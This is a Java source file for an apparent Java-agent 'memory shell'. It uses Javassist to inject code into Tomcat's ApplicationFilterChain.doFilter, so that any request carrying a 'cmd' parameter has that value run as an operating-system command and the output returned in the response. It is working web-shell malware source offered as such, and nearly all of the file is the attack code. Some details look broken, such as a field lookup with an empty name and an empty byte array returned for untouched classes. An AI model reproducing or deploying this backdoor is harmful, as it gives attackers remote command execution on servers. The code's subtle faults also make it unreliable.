import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import javassist.CtMethod;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class MemShellTransformer implements ClassFileTransformer {
    public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) {
        className = className.replace("/",".");
        if (className.equals(ClassName)){
            System.out.println("Find the Inject Class: " + ClassName);
            ClassPool pool = ClassPool.getDefault();
            try {
                CtClass c = pool.getCtClass(className);
                CtMethod m = c.getDeclaredMethod("doFilter");
                CtField declaredField = c.getDeclaredField("");
                m.insertBefore("javax.servlet.http.HttpServletRequest req =  request;\n" +
                        "javax.servlet.http.HttpServletResponse res = response;\n" +
                        "java.lang.String cmd = request.getParameter(\"cmd\");\n" +
                        "if (cmd != null){\n" +
                        "    try {\n" +
                        "        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n" +
                        "        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n" +
                        "        String line;\n" +
                        "        StringBuilder sb = new StringBuilder(\"\");\n" +
                        "        while ((line=reader.readLine()) != null){\n" +
                        "            sb.append(line).append(\"\\n\");\n" +
                        "        }\n" +
                        "        response.setCharacterEncoding(\"UTF-8\");\n" +
                        "        response.setContentType(\"text/html;charset=UTF-8\");\n" +
                        "        System.out.println(\"result: \" + sb.toString());\n" +
                        "        response.getWriter().write(sb.toString());\n" +
                        "        return;" +
                        "    } catch (Exception e){\n" +
                        "        e.printStackTrace();\n" +
                        "    }\n" +
                        "}");
                byte[] bytes = c.toBytecode();
                // 将 c 从 classpool 中删除以释放内存
                c.detach();
                return bytes;
            } catch (Exception e){
                e.printStackTrace();
            }
        }
        return new byte[0];
    }
}
